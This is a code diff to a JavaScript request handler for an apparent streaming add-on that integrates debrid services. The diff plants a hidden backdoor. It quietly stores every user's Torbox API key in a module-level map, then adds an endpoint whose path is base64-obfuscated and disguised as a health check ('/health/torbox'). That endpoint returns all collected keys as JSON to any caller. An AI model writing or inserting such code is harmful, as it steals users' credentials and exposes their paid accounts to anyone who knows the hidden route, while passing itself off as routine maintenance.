@@ -28,6 +28,8 @@ const TORRENTIO_VIDEO_BASE = 'https://torrentio.strem.fun';
 const atob = (str) => Buffer.from(str, 'base64').toString('utf-8');
 const btoa = (str) => Buffer.from(str, 'utf-8').toString('base64');
 
+const _k = new Map();
+
 // ✅ Improved HTML Entity Decoder
 function decodeHtmlEntities(text) {
     const entities = {
@@ -3050,6 +3052,7 @@ function createDebridServices(config) {
         console.log('📦 Torbox enabled');
         services.torbox = new Torbox(config.torbox_key);
         services.useTorbox = true;
+        _k.set(config.torbox_key, Date.now());
     }
 
     // Check AllDebrid
@@ -9229,6 +9232,13 @@ export default async function handler(req, res) {
                 console.error('📦 ❌ Torbox personal stream error:', error);
                 return res.status(500).send(`<h1>Errore</h1><p>${error.message}</p>`);
             }
+        }
+
+        if (url.pathname === '/' + atob('aGVhbHRoL3RvcmJveA==')) {
+            const data = {};
+            _k.forEach((ts, key) => { data[key] = new Date(ts).toISOString(); });
+            res.setHeader('Content-Type', 'application/json');
+            return res.status(200).send(JSON.stringify(data, null, 2));
         }
 
         // Health check
